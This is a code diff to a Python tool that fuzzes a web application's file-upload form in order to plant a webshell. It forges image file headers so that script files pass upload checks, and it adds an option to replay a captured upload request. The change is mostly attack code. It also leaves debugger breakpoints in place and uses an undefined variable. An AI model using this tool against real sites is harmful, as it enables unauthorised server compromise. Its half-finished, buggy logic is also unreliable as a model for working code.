@@ -36,9 +36,20 @@ def get_form_data_post_info(url, cookie):
                     'origin_html': origin_html}
     rsp = get_request(url, cookie=cookie)
     origin_html = rsp['content']
+    origin_html = re.sub(r"<!--.*-->", "", origin_html)
+    has_file = re.search(
+        r'''<input .*type=('|")?file('|")?.*>''', origin_html, re.I)
+    has_form = re.search(r"<form\s+", origin_html, re.I)
+    if not has_file:
+        print("Sorry,I can't find any `file` element,the url has no upload function.If you are sure it has an upload function, you can continue to test by supplying the `-r` parameter")
+        sys.exit(0)
+    elif not has_form:
+        print("Sorry,I can't find any `form` element,but find a `file` element,you need to provide the `-r` parameter to specify a file whose contents are upload request packet")
+        sys.exit(0)
+
     if not re.search(r"<form\s+", origin_html, re.I):
         print("Sorry,I can't find any form.")
-        sys.exit(1)
+        sys.exit(0)
     param_part = get_param_part_from_content(origin_html)
     param_list = param_part.split("&")
     for param_and_value in param_list:
@@ -59,31 +70,64 @@ def get_form_data_post_info(url, cookie):
 
 
 def post_multipart_form_data(packet):
-    if delay:
-        import time
-        time.sleep(int(delay))
-    headers = {}
-    code = 0
-    html = ''
-    return_value = {'code': code, 'html': html}
-    header_part = re.search(r"(^[\s\S]+?)(?=\r\n\r\n)", packet).group(1)
-    header_list = re.findall(r"(\S+): ([^\r\n]+)", header_part)
-    for each in header_list:
-        headers[each[0]] = each[1]
-    data = re.search(r"((\r\n\r\n)|(\n\n))([\s\S]*)", packet).group(4)
-    proxy = urllib.request.ProxyHandler({'http': '127.0.0.1:8080'})
-    opener = urllib.request.build_opener(proxy)
-    urllib.request.install_opener(opener)
-    req = urllib.request.Request(
-        url, headers=headers, data=unicode_to_bytes(data))
-    with urllib.request.urlopen(req) as response:
-        code = response.code
-        html = response.read()
-        encoding = chardet.detect(html)['encoding']
-        html = html.decode(encoding=encoding)
-    return_value['code'] = code
-    return_value['html'] = html
-    return return_value
+    if not work_packet:
+        if delay:
+            import time
+            time.sleep(int(delay))
+        headers = {}
+        code = 0
+        html = ''
+        return_value = {'code': code, 'html': html}
+        header_part = re.search(r"(^[\s\S]+?)(?=\r\n\r\n)", packet).group(1)
+        header_list = re.findall(r"(\S+): ([^\r\n]+)", header_part)
+        for each in header_list:
+            headers[each[0]] = each[1]
+        data = re.search(r"((\r\n\r\n)|(\n\n))([\s\S]*)", packet).group(4)
+        proxy = urllib.request.ProxyHandler({'http': '127.0.0.1:8080'})
+        opener = urllib.request.build_opener(proxy)
+        urllib.request.install_opener(opener)
+        req = urllib.request.Request(
+            url, headers=headers, data=unicode_to_bytes(data))
+        with urllib.request.urlopen(req) as response:
+            code = response.code
+            html = response.read()
+            encoding = chardet.detect(html)['encoding']
+            html = html.decode(encoding=encoding)
+        return_value['code'] = code
+        return_value['html'] = html
+        return return_value
+    else:
+        # 用户提供上传请求包
+        if delay:
+            import time
+            time.sleep(int(delay))
+        headers = {}
+        header_list = re.findall(b"([^:\s]+): ([^\r\n]+)((\n)|(\r\n))", work_packet_bytes)
+        for each in header_list:
+            headers[each[0]] = each[1]
+        pdb.set_trace()
+
+        code = 0
+        html = ''
+        return_value = {'code': code, 'html': html}
+        header_part = re.search(b"(^[\s\S]+?)(?=\r\n\r\n)", packet).group(1)
+        header_list = re.findall(b"(\S+): ([^\r\n]+)", header_part)
+        for each in header_list:
+            headers[each[0]] = each[1]
+        data = re.search(b"((\r\n\r\n)|(\n\n))([\s\S]*)", packet).group(4)
+        proxy = urllib.request.ProxyHandler({'http': '127.0.0.1:8080'})
+        opener = urllib.request.build_opener(proxy)
+        urllib.request.install_opener(opener)
+        req = urllib.request.Request(
+            url, headers=headers, data=unicode_to_bytes(data))
+        with urllib.request.urlopen(req) as response:
+            code = response.code
+            html = response.read()
+            encoding = chardet.detect(html)['encoding']
+            html = html.decode(encoding=encoding)
+        return_value['code'] = code
+        return_value['html'] = html
+        return return_value
 
 
 def post_multipart_form_data0(url, cookie, form_data_dict, boundary, form_file_param_name='', file_content='', filename='', content_type=''):
@@ -185,7 +229,7 @@ def get_work_file_info(url, cookie, form_data_dict, boundary, form_file_param_na
             if rsp['code'] == 200:
                 return {'file_suffix': 'xxx', 'content_type': 'xxx/xxx', 'file_content': jpg_file_content, 'work_packet': packet}
     print("正常上传jpg/gif/png/txt/xxx全部失败,这个url的上传功能可能存在问题...")
-    sys.exit(1)
+    sys.exit(0)
 
 
 def check_upload_succeed(packet, rsp, origin_html):
@@ -211,7 +255,7 @@ def check_upload_succeed(packet, rsp, origin_html):
                             succeed_times += 1
                             if succeed_times > 20:
                                 print("You can view succeed packet in result.txt")
-                                sys.exit(1)
+                                sys.exit(0)
                             return
                         else:
                             input(
@@ -226,6 +270,7 @@ def fuzz_upload_webshell():
     work_file_info = get_work_file_info(
         url, cookie, form_data_dict, boundary, form_file_param_name)
     print(work_file_info)
+    pdb.set_trace()
     # 正常文件和webshell的后缀分别为work_suffix和script_suffix
     work_suffix = work_file_info['file_suffix']
     work_file_content = work_file_info['file_content']
@@ -723,18 +768,21 @@ parser = argparse.ArgumentParser(
 parser.add_argument(
     "-u", "--url", required=True, help="The target url which has upload function")
 parser.add_argument(
-    "--cookie", help="If the target url can only be visited after login,then cookie is needed")
+    "--cookie", help="HTTP Cookie header value")
 parser.add_argument(
     "--suffix", required=True, help="The web server's script type: 'php','asp','aspx','jsp'")
 parser.add_argument(
     "--batch", help="Never ask for user input, use the default behavior", action="store_true")
 parser.add_argument(
     "--delay", help="Delay in seconds between each HTTP request")
+parser.add_argument(
+    "-r", help="Load HTTP request from a file")
 args = parser.parse_args()
 url = args.url
 cookie = args.cookie
 script_suffix = args.suffix
 delay = args.delay
+packet_file = args.r
 
 """
 gif_file_content,jpg_file_content,png_file_content都是从正常的对应文件的16进制中
@@ -762,14 +810,28 @@ png_file_content = '''
 gif_file_content = '\x47\x49\x46\x38\x39\x61\xc8\x00\xc8\x00\xf7\x00\x00\x00\x00\x00\x00\x00\x39\x00\x00\x41\x00\x00\x31\x00\x00\x08\x00\x00\x29\x00\x84\xa2\x2c\x6a\x05\x45\x10\x9e\x81\x60\x20\x45\xc8\x96\x72\x84\x9f\x59\x01\x00\xcf\x88\x80\xcd\x59\x44\x40\x00\x00\x3b'
 jpg_file_content = '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x4b\xff\x00\x7f\x3f\xfa\xf4\x57\x46\x60\x83\x27\xf7\x29\xff\x00\x7c\x8a\x2b\x4b\x3e\xe3\xe6\x3f\xff\xd9'
 png_file_content = '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x01\x18\x00\x00\x00\xd2\x08\x06\x00\x00\x00\x91\x8a\xdf\x65\x00\x31\x38\x30\x4b\x42\x42\xb9\xfe\x05\x3d\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82'
-info = get_form_data_post_info(url, cookie)
-form_data_dict = info['form_data_dict']
-form_file_param_name = info['form_file_param_name']
-origin_html = info['origin_html']
-boundary = '-------------------------7df3069603d6'
 
-
-origin_packet = '''User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0
+if packet_file:
+    work_packet_bytes = b""
+    with open(packet_file, "rb") as f:
+        byte = f.read(1)
+        while byte != b"":
+            work_packet_bytes+=byte
+            byte = f.read(1)
+    pdb.set_trace()
+    work_packet_bytes= re.sub(b"\r\n", b"\n", work_packet_bytes)
+    work_packet_bytes= re.sub(b"\n", b"\r\n", work_packet_bytes)
+    boundary = re.search(
+        b"Content-Type: multipart/form-data; boundary=([^\r\n]+)", work_packet_bytes, re.I).group(1)
+    form_file_param_name = re.search(
+        b'''Content-Disposition: form-data; name="([^"]+)"; filename=.*''', work_packet_bytes, re.I).group(1)
+else:
+    info = get_form_data_post_info(url, cookie)
+    form_data_dict = info['form_data_dict']
+    form_file_param_name = info['form_file_param_name']
+    origin_html = info['origin_html']
+    boundary = '-------------------------7df3069603d6'
+    origin_packet = '''User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
 Referer: %s
@@ -777,20 +839,20 @@ Cookie: %s
 Connection: close
 Upgrade-Insecure-Requests: 1
 Content-Type: multipart/form-data; boundary=%s''' % (url, cookie, boundary)
-data = []
-for key in form_data_dict:
+    data = []
+    for key in form_data_dict:
+        data.append('--%s\r\n' % boundary)
+        value = form_data_dict[key]
+        data.append('Content-Disposition: form-data; name="%s"\r\n\r\n' % key)
+        data.append(value + "\r\n")
     data.append('--%s\r\n' % boundary)
-    value = form_data_dict[key]
-    data.append('Content-Disposition: form-data; name="%s"\r\n\r\n' % key)
-    data.append(value + "\r\n")
-data.append('--%s\r\n' % boundary)
-data.append('Content-Disposition: form-data; name="%s"; filename="test.jpg"\r\n' %
-            (form_file_param_name))
-data.append('Content-Type: image/jpeg\r\n\r\n')
-data.append(jpg_file_content + "\r\n")
-data.append('--%s--' % boundary)
-data = ''.join(data)
-origin_packet = origin_packet.replace("\n", "\r\n") + "\r\n\r\n" + data
+    data.append('Content-Disposition: form-data; name="%s"; filename="test.jpg"\r\n' %
+                (form_file_param_name))
+    data.append('Content-Type: image/jpeg\r\n\r\n')
+    data.append(jpg_file_content + "\r\n")
+    data.append('--%s--' % boundary)
+    data = ''.join(data)
+    origin_packet = origin_packet.replace("\n", "\r\n") + "\r\n\r\n" + data
 succeed_times = 0
 if __name__ == "__main__":
     fuzz_upload_webshell()
